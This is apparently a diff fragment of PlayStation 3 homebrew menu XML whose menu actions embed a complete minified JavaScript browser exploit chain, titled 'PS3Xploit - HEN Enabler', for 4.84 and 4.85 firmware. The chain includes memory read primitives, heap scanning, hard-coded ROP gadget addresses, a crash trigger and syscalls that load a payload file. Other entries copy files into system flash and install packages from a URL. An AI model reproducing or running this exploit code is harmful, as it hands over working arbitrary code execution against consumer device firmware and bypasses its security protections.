Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(1===a.length)return a[0];var b="",c=0\76this?"-":"",d=a[0].replace(".","");a=Number(a[1])+1;if(0\76a){for(b=c+"0.";a++;)b+="0";return b+d.replace(/^-/,"")}for(a-=d.length;a--;)b+="0";return d+b};function fromIEEE754(a,b,c){var d=[],e,f;for(e=a.length;e;--e){var g=a[e-1];for(f=8;f;--f)d.push(g%2?1:0),g\76\76=1}d.reverse();f=d.join("");a=(1\74\74b-1)-1;d=parseInt(f.substring(0,1),2)?-1:1;e=parseInt(f.substring(1,1+b),2);f=parseInt(f.substring(1+b),2);return(e===(1\74\74b)-1?0!==f?NaN:Infinity*d:0\74e?d*Math.pow(2,e-a)*(1+f/Math.pow(2,c)):0!==f?f/Math.pow(2,c)*Math.pow(2,-(a-1))*d:0*d).noExponents()}function generateIEEE754(a,b){return fromIEEE754([a\76\7624&255,a\76\7616&255,a\76\768&255,a&255,b\76\7624&255,b\76\7616&255,b\76\768&255,b&255],11,52)}function generateExploit(a,b){return generateIEEE754(a,(a\74\7432|(b\76\761)-1)-a)}function rmem(a,b){document.getElementById("exploit")&&(document.getElementById("exploit").style.src="local("+generateExploit(a,b)+")")}function cmem(a,b,c){if(document.getElementById("exploit"))return rmem(a,b),document.getElementById("exploit").style.src.substr(6,c)}function trigger(a){document.getElementById("trigger")&&(document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")"))}function lc1(){total_loops\74max_loops?t_out=setTimeout(initROP,500,!1):(total_loops=0,show(fail_msg_frag),t_out=0)}function lc2(){total_loops\74max_loops?t_out=setTimeout(initROP2,500,!1):(total_loops=0,show(fail_msg_frag),2,t_out=0)}function findJsVariableOffset(a,b,c,d){rmem(c,d);a=document.getElementById("exploit").style.src.substr(6,d);d=0;for(var e,f;d\742*a.length;){if(a.charCodeAt(d/2)===b.charCodeAt(0)){for(e=f=0;e\742*b.length&&a.charCodeAt((d+e)/2)===b.charCodeAt(e/2);e+=2)f+=1;if(f===b.length){c=c+d+4;for(b=0;b\74offset_array.length;b+=1)if(offset_array[b]===c)return-1;offset_array.push(c);return c}}d+=16}return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,112)}function stack_frame_hookup(){return unescape("\u4141\u2a2f")+hw(gadget1_addr)+hw(toc_addr)+fill16(32,dbyte41)+hdw(toc_addr)+fill16(112,dbyte41)}function scall(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod4a_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function callsub(a,b,c,d,e,f,g,k,l,h,p,m,n){null===n&&(n=gtemp_addr);null===m&&(m=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(h)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(m)+fill16(16,dbyte41)+hdw(a)+fill16(p-32,dbyte00)+hdw(n)+hdw(sp_exit)+fill8(8,dbyte41)}function fillNbytes(a,b,c){var d="",e=0;for(b=h2b(b);e\74a/c;)d+=b.repeat(c/2),e++;return d}function fill4(a,b){return fillNbytes(a,b,4)}function fill8(a,b){return fillNbytes(a,b,8)}function fill16(a,b){return fillNbytes(a,b,16)}function strncmp(a,b,c){a=a.substring(0,c);b=b.substring(0,c);return a==b?0:a\76b?1:-1}function rop_exit_hen(a){a=cmem(2315255808,16,3);a=a.toAscii(!0);0!=strncmp("53434500",a,4)?(show("Failed! Rebooting!"),initROP2(!0)):window.close()}function initROP2(a){try{!0===a&&(total_loops=search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(stack_frame=stack_frame_hookup()+stack_frame_swap(2315649024);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var b=cmem(stack_frame_addr-4,32768,stack_frame.length),c=cmem(jump_2_addr-4,4096,jump_2.length),d=cmem(jump_1_addr-4,4096,jump_1.length);c===jump_2&&d===jump_1&&b===stack_frame?(0!==t_out&&clearTimeout(t_out),setTimeout(trigger,1E3,jump_1_addr)):lc2()}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(a){try{!0===a&&(search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=xtra_data_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(xtra_data=start_x.convert()+"/dev_flash/hen/PS3HEN.BIN".convert()+index_key.convert(!0)+unescape("\ufd7e");0===xtra_data_addr;){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(32509));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var b=xtra_data_addr+start_x.convertedSize()-4;index_key_addr=b+"/dev_flash/hen/PS3HEN.BIN".convertedSize();for(stack_frame=stack_frame_hookup()+scall(801,b,0,2382364672,0,0,0,0,0)+scall_r3r5_p2p(802,2382364672,2315255808,3145728,2382364680,0,0,0,0,0,0)+stack_frame_swap(2315255808);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var c=cmem(stack_frame_addr-4,32768,stack_frame.length),d=cmem(xtra_data_addr-4,4096,xtra_data.length),e=cmem(jump_2_addr-4,4096,jump_2.length),f=cmem(jump_1_addr-4,4096,jump_1.length);e===jump_2&&f===jump_1&&d===xtra_data&&c===stack_frame?(0!==t_out&&clearTimeout(t_out),triggerX()):lc1()}catch(g){show("HEN installation failed because the following exception was thrown during execution: "+g+" at: "+g.lineNumber)}}function stack_frame_swap(a){return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a)+fill8(8,dbyte41)+hdw(gmod9_addr)}function triggerX(){setTimeout(trigger,1E3,jump_1_addr);setTimeout(rop_exit_hen,4500,"HEN Failed!");total_loops=t_out=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{left:100%;overflow:hidden;position:relative}input{opacity:0;position:relative;left:-100%}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;vertical-align:middle;width:100%}#result{font-size:20px;font-weight:bold;color:#fff;padding-top:16px}#dot{-webkit-border-radius:180px;background-color:rgba(255,255,255,0.4);width:160px;height:160px;position:relative;display:inline-block}#dot::before,#dot::after{-webkit-border-radius:180px;content:"";width:188px;height:188px;position:absolute;left:-20px;top:-20px;z-index:-1;border:6px solid rgba(255,255,255,0.4);background-color:transparent}#dot::after{width:176px;height:176px;left:-11px;top:-11px;border:3px solid rgba(255,255,255,0.4)}#c{margin-top:62px;left:16px;position:relative}#c div{-webkit-border-radius:8px;position:absolute;background:#fff}#c div:nth-child(1), #c div:nth-child(3), #c div:nth-child(6), #c div:nth-child(8){width:10px;height:40px}#c div:nth-child(2){height:10px;width:24px;left:12px;top:15px}#c div:nth-child(3){left:32px}#c div:nth-child(4){-webkit-border-radius:40px;width:26px;height:26px;left:48px;border:8px solid #fff;background-color:transparent;border-right-color:transparent}#c div:nth-child(5), #c div:nth-child(7){left:100px;top:8px;background-color:transparent;font-size:26px;font-weight:bolder;text-shadow:0px 4px #fff;color:#fff;letter-spacing:-24px}#c div:nth-child(5){left:60px;top:4px;font-size:20px;text-shadow:3px 0px #fff}#c div:nth-child(6){left:88px}#c div:nth-child(8){left:120px}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76 \74input type="radio" autofocus /\76\74div id="a"\76\74div id="b"\76\74div id="dot"\76\74div id="c"\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\u2571\74/div\76\74div\76\74/div\76\74div\76\u2572\u2572\74/div\76\74div\76\74/div\76\74/div\76\74/div\76\74div id="result"\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(!0)},0);')</></Pair>
+			</Table>
+			<Table key="hen_484_enabler_installer">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Promote HEN Enabler</></Pair>
+				<Pair key="info"><>Install a 4.84 HEN Enabler to the root of the game category</></Pair>
+			</Table>
+			<Table key="hen_484_reinstall">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/package_setup.png</></Pair>
+				<Pair key="title"><>Reinstall HEN</></Pair>
+				<Pair key="info"><>Download and install HEN for 4.84 HFW
+				Note: HEN must be enabled above first</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="hen_484_enabler" attr="hen_484_enabler"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_484_enabler_installer" attr="hen_484_enabler_installer" src="#hen_484_enabler_installer_item"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="hen_484_reinstall" attr="hen_484_reinstall" src="#hen_484_reinstall_item"/> -->
+		</Items>
+	</View>
+	
+	<View id="hen_484_enabler_installer_item">
+		<Attributes>
+			<Table key="hen_484_enabler_promoter_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Current HEN Enabler will be overwritten, are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back.
+				
+				This will copy a hen_enabler.xml for 4.84 to dev_flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/hen_enablers/484#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/module-action" key="hen_484_enabler_promoter_action" attr="hen_484_enabler_promoter_action" />
+		</Items>
+	</View>
+	
+	<View id="hen_484_reinstall_item">
+		<Attributes>
+			<Table key="hen_484_reinstall_action">
+				<Pair key="info"><>net_package_install</></Pair>
+				<Pair key="pkg_src"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="pkg_src_qa"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="content_name"><>msg_install</></Pair>
+				<Pair key="content_id"><>CUSTOM-ULTOOLBOX_00-DEVIL30300000000</></Pair>
+				<Pair key="prod_pict_path"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/download_hen.png</></Pair>
+ 			</Table> 
+		</Attributes> 
+		<Items>
+			<Item class="type:x-xmb/xmlnpsignup" key="hen_484_reinstall_action" attr="hen_484_reinstall_action"/>
+		</Items> 
+	</View>
+
+	<View id="hen_485_items">
+		<Attributes>
+			<Table key="hen_485_enabler">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/arrow.png</></Pair>
+				<Pair key="title"><>Enable HEN</></Pair>
+				<Pair key="info"><>4.85 HFW Only   </></Pair>
+				<Pair key="module_name"><>webrender_plugin</></Pair>
+				<Pair key="module_action"><>javascript:window.resizeTo(1920,1080);eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=4376440,gmod4c_addr=346864,gmod15_addr=3788856,gmod12_addr=6500700,gmod9_addr=68384,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),fail_msg_frag="HEN Exploit initialization failed!",fsopen=801,fsread=802,fswrite=803,fsclose=804,fsstat=808;"4.85"===fwv&&(toc_addr=7296344,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352856,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod4b_addr=4376440,gmod4c_addr=346864,gmod7_addr=108204,gmod8_addr=2862264,gmod9_addr=68384,gmod12_addr=6500860,gmod15_addr=3788856);function show(a){document.getElementById("result").innerHTML=a}function scall_r3r5_p2p(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+fill4(4,dbyte41)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(16,dbyte41)+hdw(d-4)+hdw(gtemp_addr)+fill8(24,dbyte41)+hdw(gmod4c_addr)+fill16(176,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod4b_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function load_r3_word_from_ptr_32(a,b,c,d,e,f,g){return hdw(gmod3_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a-8)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod15_addr)+fill16(80,dbyte41)+fill8(8,dbyte41)+hdw(b)+hdw(c)+hdw(d)+hdw(e)+hdw(f)+hdw(g)+hdw(sp_exit)+fill8(8,dbyte41)}function h2b(a){return String.fromCharCode(a)}function hw(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hdw(a){return hw(0)+hw(a)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(a){for(var b="",c=0;c\74this.length;)b=!0===a?b+this.charCodeAt(c).toString(16).toHex16():b+this.charCodeAt(c).toString(16),c+=1;return b};String.prototype.convert=function(a){if(1\76this.length)return"";var b=0,c=[];for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";for("00"!==a.substr(a.length-3,2)&&(a+="0000");b\74a.length;){var d=a.substr(b,4);c.push(String.fromCharCode(parseInt(d,16)));b+=4}return c.join("")};String.prototype.convertedSize=function(a){if(1\76this.length)return 0;for(a=!0===a?this:this.toAscii();0!==a.length%4;)a+="00";"00"!==a.substr(a.length-3,2)&&(a+="0000");return a.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(1===a.length)return a[0];var b="",c=0\76this?"-":"",d=a[0].replace(".","");a=Number(a[1])+1;if(0\76a){for(b=c+"0.";a++;)b+="0";return b+d.replace(/^-/,"")}for(a-=d.length;a--;)b+="0";return d+b};function fromIEEE754(a,b,c){var d=[],e,f;for(e=a.length;e;--e){var g=a[e-1];for(f=8;f;--f)d.push(g%2?1:0),g\76\76=1}d.reverse();f=d.join("");a=(1\74\74b-1)-1;d=parseInt(f.substring(0,1),2)?-1:1;e=parseInt(f.substring(1,1+b),2);f=parseInt(f.substring(1+b),2);return(e===(1\74\74b)-1?0!==f?NaN:Infinity*d:0\74e?d*Math.pow(2,e-a)*(1+f/Math.pow(2,c)):0!==f?f/Math.pow(2,c)*Math.pow(2,-(a-1))*d:0*d).noExponents()}function generateIEEE754(a,b){return fromIEEE754([a\76\7624&255,a\76\7616&255,a\76\768&255,a&255,b\76\7624&255,b\76\7616&255,b\76\768&255,b&255],11,52)}function generateExploit(a,b){return generateIEEE754(a,(a\74\7432|(b\76\761)-1)-a)}function rmem(a,b){document.getElementById("exploit")&&(document.getElementById("exploit").style.src="local("+generateExploit(a,b)+")")}function cmem(a,b,c){if(document.getElementById("exploit"))return rmem(a,b),document.getElementById("exploit").style.src.substr(6,c)}function trigger(a){document.getElementById("trigger")&&(document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")"))}function lc1(){total_loops\74max_loops?t_out=setTimeout(initROP,500,!1):(total_loops=0,show(fail_msg_frag),t_out=0)}function lc2(){total_loops\74max_loops?t_out=setTimeout(initROP2,500,!1):(total_loops=0,show(fail_msg_frag),2,t_out=0)}function findJsVariableOffset(a,b,c,d){rmem(c,d);a=document.getElementById("exploit").style.src.substr(6,d);d=0;for(var e,f;d\742*a.length;){if(a.charCodeAt(d/2)===b.charCodeAt(0)){for(e=f=0;e\742*b.length&&a.charCodeAt((d+e)/2)===b.charCodeAt(e/2);e+=2)f+=1;if(f===b.length){c=c+d+4;for(b=0;b\74offset_array.length;b+=1)if(offset_array[b]===c)return-1;offset_array.push(c);return c}}d+=16}return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,112)}function stack_frame_hookup(){return unescape("\u4141\u2a2f")+hw(gadget1_addr)+hw(toc_addr)+fill16(32,dbyte41)+hdw(toc_addr)+fill16(112,dbyte41)}function scall(a,b,c,d,e,f,g,k,l,h){null===h&&(h=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(a)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod4a_addr)+fill16(96,dbyte41)+hdw(h)+hdw(sp_exit)+fill8(8,dbyte41)}function callsub(a,b,c,d,e,f,g,k,l,h,p,m,n){null===n&&(n=gtemp_addr);null===m&&(m=gtemp_addr);return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+fill16(16,dbyte41)+hdw(gmod1_addr)+fill16(80,dbyte41)+fill4(12,dbyte41)+hw(h)+hw(l)+hw(g)+hw(f)+hw(e)+hw(d)+hw(c)+fill4(4,dbyte41)+hw(k)+fill16(32,dbyte41)+hdw(b)+fill16(16,dbyte41)+hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(m)+fill16(16,dbyte41)+hdw(a)+fill16(p-32,dbyte00)+hdw(n)+hdw(sp_exit)+fill8(8,dbyte41)}function fillNbytes(a,b,c){var d="",e=0;for(b=h2b(b);e\74a/c;)d+=b.repeat(c/2),e++;return d}function fill4(a,b){return fillNbytes(a,b,4)}function fill8(a,b){return fillNbytes(a,b,8)}function fill16(a,b){return fillNbytes(a,b,16)}function strncmp(a,b,c){a=a.substring(0,c);b=b.substring(0,c);return a==b?0:a\76b?1:-1}function rop_exit_hen(a){a=cmem(2315255808,16,3);a=a.toAscii(!0);0!=strncmp("53434500",a,4)?(show("Failed! Rebooting!"),initROP2(!0)):window.close()}function initROP2(a){try{!0===a&&(total_loops=search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(stack_frame=stack_frame_hookup()+stack_frame_swap(2315649024);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var b=cmem(stack_frame_addr-4,32768,stack_frame.length),c=cmem(jump_2_addr-4,4096,jump_2.length),d=cmem(jump_1_addr-4,4096,jump_1.length);c===jump_2&&d===jump_1&&b===stack_frame?(0!==t_out&&clearTimeout(t_out),setTimeout(trigger,1E3,jump_1_addr)):lc2()}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(a){try{!0===a&&(search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=xtra_data_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(xtra_data=start_x.convert()+"/dev_flash/hen/PS3HEN.BIN".convert()+index_key.convert(!0)+unescape("\ufd7e");0===xtra_data_addr;){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(32509));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var b=xtra_data_addr+start_x.convertedSize()-4;index_key_addr=b+"/dev_flash/hen/PS3HEN.BIN".convertedSize();for(stack_frame=stack_frame_hookup()+scall(801,b,0,2382364672,0,0,0,0,0)+scall_r3r5_p2p(802,2382364672,2315255808,3145728,2382364680,0,0,0,0,0,0)+stack_frame_swap(2315255808);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var c=cmem(stack_frame_addr-4,32768,stack_frame.length),d=cmem(xtra_data_addr-4,4096,xtra_data.length),e=cmem(jump_2_addr-4,4096,jump_2.length),f=cmem(jump_1_addr-4,4096,jump_1.length);e===jump_2&&f===jump_1&&d===xtra_data&&c===stack_frame?(0!==t_out&&clearTimeout(t_out),triggerX()):lc1()}catch(g){show("HEN installation failed because the following exception was thrown during execution: "+g+" at: "+g.lineNumber)}}function stack_frame_swap(a){return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a)+fill8(8,dbyte41)+hdw(gmod9_addr)}function triggerX(){setTimeout(trigger,1E3,jump_1_addr);setTimeout(rop_exit_hen,4500,"HEN Failed!");total_loops=t_out=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{left:100%;overflow:hidden;position:relative}input{opacity:0;position:relative;left:-100%}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;vertical-align:middle;width:100%}#result{font-size:20px;font-weight:bold;color:#fff;padding-top:16px}#dot{-webkit-border-radius:180px;background-color:rgba(255,255,255,0.4);width:160px;height:160px;position:relative;display:inline-block}#dot::before,#dot::after{-webkit-border-radius:180px;content:"";width:188px;height:188px;position:absolute;left:-20px;top:-20px;z-index:-1;border:6px solid rgba(255,255,255,0.4);background-color:transparent}#dot::after{width:176px;height:176px;left:-11px;top:-11px;border:3px solid rgba(255,255,255,0.4)}#c{margin-top:62px;left:16px;position:relative}#c div{-webkit-border-radius:8px;position:absolute;background:#fff}#c div:nth-child(1), #c div:nth-child(3), #c div:nth-child(6), #c div:nth-child(8){width:10px;height:40px}#c div:nth-child(2){height:10px;width:24px;left:12px;top:15px}#c div:nth-child(3){left:32px}#c div:nth-child(4){-webkit-border-radius:40px;width:26px;height:26px;left:48px;border:8px solid #fff;background-color:transparent;border-right-color:transparent}#c div:nth-child(5), #c div:nth-child(7){left:100px;top:8px;background-color:transparent;font-size:26px;font-weight:bolder;text-shadow:0px 4px #fff;color:#fff;letter-spacing:-24px}#c div:nth-child(5){left:60px;top:4px;font-size:20px;text-shadow:3px 0px #fff}#c div:nth-child(6){left:88px}#c div:nth-child(8){left:120px}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76 \74input type="radio" autofocus /\76\74div id="a"\76\74div id="b"\76\74div id="dot"\76\74div id="c"\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\u2571\74/div\76\74div\76\74/div\76\74div\76\u2572\u2572\74/div\76\74div\76\74/div\76\74/div\76\74/div\76\74div id="result"\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(!0)},0);')</></Pair>
+			</Table>
+			<Table key="hen_485_enabler_installer">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
